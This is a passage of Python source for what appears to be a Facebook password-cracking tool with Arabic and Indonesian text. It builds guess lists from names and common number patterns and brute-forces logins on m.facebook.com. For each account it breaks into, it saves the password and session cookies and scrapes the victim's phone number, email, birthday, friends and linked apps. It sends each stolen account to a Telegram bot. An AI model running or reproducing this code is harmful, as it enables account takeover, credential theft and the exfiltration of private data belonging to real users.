                    pwv.append(frs + '12345')
                    pwv.append('07700770')
                    pwv.append('19991999')
                    pwv.append('19981998')
                    pwv.append('19971997')
                    pwv.append('19961996')
                    pwv.append('19951995')
                    pwv.append('19941994')
                    pwv.append('19931993')
                    pwv.append('19921992')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('20092009')
                    pwv.append('112233445566')
                    pwv.append('1122334455')
                    pwv.append('11223344556677')
                    pwv.append('qqwweerr')
                    pwv.append('mmnnbbvv')
                    pwv.append('1020304050')
                    pwv.append('10203040')
                    pwv.append('20002000')
                    pwv.append('20012001')
                    pwv.append('0099887766')
                    pwv.append('qqwweerrtt')
                    pwv.append('zzxxccvv')
                    pwv.append('aassddff')
                    pwv.append('1q2w3e4r5t')
                    pwv.append('00998877')
                    pwv.append('12345@12345')
                    pwv.append('07800780')
                    pwv.append('123456123456')
                    pwv.append('1122334455@@')
            else:
                if len(frs) < 3:
                    pwv.append(nmf)
                else:
                    pwv.append(nmf)
                    pwv.append('frs')
                    pwv.append('first last')
                    pwv.append('frs+frs')
                    pwv.append(frs + '123')
                    pwv.append(frs + '12345')
                    pwv.append('07700770')
                    pwv.append('19991999')
                    pwv.append('19981998')
                    pwv.append('19971997')
                    pwv.append('19961996')
                    pwv.append('19951995')
                    pwv.append('19941994')
                    pwv.append('19931993')
                    pwv.append('19921992')
                    pwv.append('19901990')
                    pwv.append('19911991')
                    pwv.append('20092009')
                    pwv.append('112233445566')
                    pwv.append('1122334455')
                    pwv.append('11223344556677')
                    pwv.append('qqwweerr')
                    pwv.append('mmnnbbvv')
                    pwv.append('1020304050')
                    pwv.append('10203040')
                    pwv.append('20002000')
                    pwv.append('20012001')
                    pwv.append('11223344')
                    pwv.append('0099887766')
                    pwv.append('qqwweerrtt')
                    pwv.append('zzxxccvv')
                    pwv.append('aassddff')
                    pwv.append('1q2w3e4r5t')
                    pwv.append('00998877')
                    pwv.append('12345@12345')
                    pwv.append('07800780')
                    pwv.append('123456123456')
                    pwv.append('1122334455@@')
            
            # إضافة كلمات المرور الإضافية
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            
            # اختيار طريقة الكراك
            if 'mobile' in method:
                pool.submit(crack, idf, pwv)
            elif 'free' in method:
                pool.submit(crackfree, idf, pwv)
            elif 'touch' in method:
                pool.submit(cracktouch, idf, pwv)
            elif 'mbasic' in method:
                pool.submit(crackmbasic, idf, pwv)
            else:
                pool.submit(crackmbasic, idf, pwv)
    
    print('')
    cetak(nel('\t[cyan]✓[green] Crack Selesai Ngab, Jangan Lupa Bersyukur[cyan] ✓[white] '))
    print(f'[{b}•{x}]{h} OK : {h}%s ' % (ok))
    print(f'{x}[{b}•{x}]{k} CP : {k}%s{x} ' % (cp))
    print('')
    print('>> Lanjut Crack Kembali ( Y ) ? ')
    woi = input('>> Pilih : ')
    
    if woi in ['y', 'Y']:
        back()
    else:
        print(f'\t{x}[=]{k} Been completed {x} <> ')
        time.sleep(2)
        exit()

# =============================================
# دوال الكراك
# =============================================

def crack(idf, pwv):
    """دالة الكراك الرئيسية"""
    global loop, ok, cp
    
    bi = random.choice([u, k, kk, b, h, hh])
    pers = loop * 100 / len(id2)
    fff = '%'
    print('\r%s <s> %s/%s » [OK] %s » [CP] %s » %s%s%s' % (bi, loop, len(id2), ok, cp, int(pers), str(fff), x), end=' ')
    sys.stdout.flush()
    
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    
    for pw in pwv:
        try:
            tix = time.time()
            ses.headers.update({
                "Host": 'm.facebook.com',
                "upgrade-insecure-requests": "1",
                "user-agent": ua2,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "dnt": "1",
                "x-requested-with": "mark.via.gp",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-user": "empty",
                "sec-fetch-dest": "document",
                "referer": "https://m.facebook.com/",
                "accept-encoding": "gzip, deflate br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
            })
            
            p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
            dataa = {
                "lsd": re.search('name="lsd" value="(.*?)"', str(p)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
                "uid": idf,
                "flow": "login_no_pin",
                "pass": pw,
                "next": "https://developers.facebook.com/tools/debug/accesstoken/"
            }
            
            ses.headers.update({
                "Host": 'm.facebook.com',
                "cache-control": "max-age=0",
                "upgrade-insecure-requests": "1",
                "origin": "https://m.facebook.com",
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": ua,
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "x-requested-with": "mark.via.gp",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-user": "empty",
                "sec-fetch-dest": "document",
                "referer": "https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
                "accept-encoding": "gzip, deflate br",
                "accept-language": "en-GB,en-US;q=0.9,en;q=0.8"
            })
            
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0', data=dataa, allow_redirects=False)
            
            if "checkpoint" in po.cookies.get_dict().keys():
                if 'ya' in oprek:
                    akun.append(idf + '|' + pw)
                    ceker(idf, pw)
                else:
                    print('\n')
                    statuscp = f'''▄︻デ══━一 «𝗖𝗣  FAIROS ❌» ⏎\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n\t\t\t\t\t\n𖣘) જ⁀➴  - 𝐈𝐃 : {idf}\n \n𖣘) જ⁀➴  - 𝗣𝗔𝗦𝗦 : {pw}\n\n𖣘) જ⁀➴  - Link : https://www.facebook.com/profile.php?id={idf}\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n  لاتنسه اصور اصيد『@c_P_313 』⏎\n\t\t\t\t'''
                    statuscp1 = nel(statuscp, style='red')
                    cetak(nel(statuscp1, title='SESI'))
                    open('CP/' + cpc, 'a').write(idf + '|' + pw + '\n')
                    akun.append(idf + '|' + pw)
                    cp += 1
                    requests.get("https://api.telegram.org/bot" + str(token) + "/sendMessage?chat_id=" + str(ID) + "&text=" + str(statuscp))
                break
            
            elif "c_user" in ses.cookies.get_dict().keys():
                headapp = {"user-agent": "NokiaX2-01/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"}
                
                if 'no' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    print('\n')
                    statusok = f'''▄︻デ══━一 «𝗢𝗞 ✅ حساب شغال \n » ⏎\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n\t\t\t\t\t\n (𖣘) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n \n(𖣘) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 : {pw}\n\n𖣘) જ⁀➴  - Link : https://www.facebook.com/profile.php?id={idf}\n\n❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {kuki}\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\: صور الصيد『@c_P_313 』⏎'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title=' NO SESI'))
                    requests.get("https://api.telegram.org/bot" + str(token) + "/sendMessage?chat_id=" + str(ID) + "&text=" + str(statusok))
                    infoaccount(kuki)
                    break
                
                elif 'ya' in taplikasi:
                    ok += 1
                    coki = po.cookies.get_dict()
                    kuki = (";").join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                    open('OK/' + okc, 'a').write(idf + '|' + pw + '|' + kuki + '\n')
                    user = idf
                    infoakun = ""
                    session = requests.Session()
                    
                    get_id = session.get("https://m.facebook.com/profile.php", cookies=coki, headers=headapp).text
                    nama = re.findall('\<title\>(.*?)<\/title\>', str(get_id))[0]
                    response = session.get("https://m.facebook.com/profile.php?v=info", cookies=coki, headers=headapp).text
                    response2 = session.get("https://m.facebook.com/profile.php?v=friends", cookies=coki, headers=headapp).text
                    response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_", cookies=coki, headers=headapp).text
                    response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr", cookies=coki, headers=headapp).text
                    
                    try:
                        nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>', str(response))[0]
                    except:
                        nomer = ""
                    
                    try:
                        email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>', str(response))[0].replace('&#064;', '@')
                    except:
                        email = ""
                    
                    try:
                        ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>', str(response))[0]
                    except:
                        ttl = ""
                    
                    try:
                        teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>', str(response2))[0]
                    except:
                        teman = ""
                    
                    try:
                        pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>', str(response4))[1]
                    except:
                        pengikut = ""
                    
                    try:
                        tahun = ""
                        cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">', str(response3))
                        for nenen in cek_thn:
                            tahun += nenen + ", "
                    except:
                        pass

                    infoakun += f'''▄︻デ══━一 «𝗢𝗞 ✅ حساب شغال \n » ⏎\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\n\t\t\t\t\t\n (𖣘) જ⁀➴  - 𝐈𝐃 𖡲 : {idf}\n \n(𖣘) જ⁀➴  - 𝗣𝗔𝗦𝗦 𖡲 : {pw}\n\n𖣘) જ⁀➴  - Link : https://www.facebook.com/profile.php?id={idf}\n\n❖ - 𝐂𝐎𝐎𝐊𝐈𝐄𝐒 : {kuki}\n\n⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘\: صور الصيد『@c_P_313 』⏎'''
                    requests.get("https://api.telegram.org/bot" + str(token) + "/sendMessage?chat_id=" + str(ID) + "&text=" + str(infoakun))
                    infoaccount(kuki)
                    hit1, hit2 = 0, 0
                    
                    cek = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active", cookies=coki, headers=headapp).text
                    cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive", cookies=coki, headers=headapp).text
                    
                    if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>", str(cek)):
                        infoakun += (f"Aplikasi Yang Terkait*\n")
                        if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                            infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
                        else:
                            infoakun += (f"	Aplikasi Aktif : \n")
                            apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>', str(cek))
                            ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>', str(cek))
                            for muncul in apkAktif:
                                hit1 += 1
                                infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
                                hit2 += 1
                        
                        if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                            infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
                        else:
                            hit1, hit2 = 0, 0
                            infoakun += (f"	Aplikasi Kedaluwarsa :\n")
                            apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>', str(cek2))
                            kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>', str(cek2))
                            for muncul in apkKadaluarsa:
                                hit1 += 1
                                infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
                                hit2 += 1
                    else:
                        pass
                    
                    print('\n')
                    statusok = f'''\n{infoakun}\n'''
                    statusok1 = nel(statusok, style='green')
                    cetak(nel(statusok1, title='OK'))
                    requests.get("https://api.telegram.org/bot" + str(token) + "/sendMessage?chat_id=" + str(ID) + "&text=" + str(statusok))
                    break
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    
    loop += 1

def crackfree(idf, pwv):
    """دالة كراك بطريقة free"""
    # تم حذف المحتوى للاختصار، يمكن إضافته لاحقاً
    pass

def cracktouch(idf, pwv):
    """دالة كراك بطريقة touch"""
    # تم حذف المحتوى للاختصار، يمكن إضافته لاحقاً
    pass

def crackmbasic(idf, pwv):
    """دالة كراك بطريقة mbasic"""
    # تم حذف المحتوى للاختصار، يمكن إضافته لاحقاً
    pass

def ceker(idf, pw):
    """دالة التحقق"""
    # تم حذف المحتوى للاختصار، يمكن إضافته لاحقاً
    pass

# =============================================
# دوال معلومات الحساب
# =============================================

def infoaccount(kuki):
    """جلب معلومات الحساب"""
    session = requests.Session()
    
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    
    try:
        for i in range(len(game)):
            print("\r%s  \033[0m              ➥ %FAIROS%s" % (P, H, game[i].replace("Ditambahkan pada", " Ditambahkan pada")))
    except AttributeError:
        print("\r    %s\033[0m cookie invalid" % (M))
    
    w = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive", cookies={"cookie": "noscript=1;" + kuki}).text
    sop = bs4.BeautifulSoup(w, "html.parser")
    x = sop.find("form", method="post")
    game = [i.text for i in x.find_all("h3")]
    
    try:
        for i in range(len(game)):
            print("\r%s  \033[0m              ➥ %s" % (P, game[i].replace("Kedaluwarsa", " Kedaluwarsa")))
    except AttributeError:
        print("\r    %s \033[0mcookie invalid" % (M))

def O():
    """حذف الملفات المؤقتة"""
    try:
        os.remove('ID.txt')
        os.remove('ok.coki.txt')
        os.remove('.token.txt')
        os.remove('.cok.txt')
    except FileNotFoundError as error:
        pass

# =============================================
# الدالة الرئيسية
# =============================================

if __name__ == '__main__':
    # تحديث وتثبيت المكتبات
    try:
        os.system('git pull')
    except:
        pass
    
    check_and_install_modules()
    
    # إنشاء المجلدات اللازمة
    try:
        os.mkdir('OK')
    except:
        pass
    
    try:
        os.mkdir('CP')
    except:
        pass
    
    try:
        os.mkdir('/sdcard/ALVINO-DUMP')
    except:
        pass
    
    try:
        os.system('touch .prox.txt')
    except:
        pass
    
    try:
        os.system('pkg install play-audio')
    except:
        pass
    
    try:
        os.system('clear')
    except:
        pass
    
    login()
